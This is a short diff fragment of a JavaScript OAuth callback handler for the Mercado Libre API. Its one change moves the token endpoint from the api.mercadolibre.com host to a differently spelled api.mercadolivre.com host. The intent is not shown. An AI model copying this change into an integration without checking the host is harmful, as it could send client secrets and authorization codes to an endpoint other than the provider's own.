@@ -10,7 +10,7 @@ export default async function handler(req, res) {
   }
 
   try {
-    const tokenUrl = "https://api.mercadolibre.com/oauth/token";
+    const tokenUrl = "https://api.mercadolivre.com/oauth/token";
     const redirectUri = `https://${req.headers.host}/api/auth/callback`;
 
     const params = new URLSearchParams();
